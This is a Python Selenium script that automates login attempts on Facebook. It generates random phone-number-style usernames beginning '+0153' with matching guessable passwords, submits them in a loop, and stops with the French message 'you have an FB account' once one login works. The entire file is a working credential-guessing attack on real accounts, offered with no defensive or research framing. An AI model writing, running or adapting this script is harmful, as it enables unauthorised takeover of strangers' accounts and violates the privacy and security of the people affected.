from selenium import webdriver 
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException 
from selenium.webdriver.common.by import By
import random, time


options = webdriver.ChromeOptions()
#chrome_options.add_argument('--headless')
options.add_argument('--incognito')
options.add_argument("--start-maximized")    
driver = webdriver.Chrome( options=options)       

A = random.randint(100000,999999)
A = str(A)
B = '+0153'
C = B + A
D = '0153'+A[:-4]
#driver.set_page_load_timeout(30)
driver.get("https://www.facebook.com")
email = driver.find_element(By.NAME,"email")  
password = driver.find_element(By.NAME,"pass")
email.send_keys(C)
password.send_keys(D)
password.send_keys('\ue007')
time.sleep(5)
#verif1 = driver.find_element(By.XPATH,"/html/body/div[1]/div/div[1]/div[1]/div[2]/div[4]/div[1]/div[2]/span/div/div[1]") #("/html/body/div[1]/div/div[1]/div[1]/div[2]/div[3]/div/div[1]/div[1]")
driver.get("https://www.facebook.com")
time.sleep(5)
try:
    while email  :
        A = random.randint(100000,999999)
        A = str(A)
        B = '+0153'
        C = B + A
        D ='0153'+ A[:-4]
        #driver.set_page_load_timeout(30)
        driver.get("https://www.facebook.com")
        email = driver.find_element(By.NAME,"email")  
        password = driver.find_element(By.NAME,"pass")
        email.send_keys(C)
        password.send_keys(D)
        password.send_keys('\ue007')
        time.sleep(5)
except NoSuchElementException :
    print("vous avez un compte FB")
    time.sleep(10000)
    pass
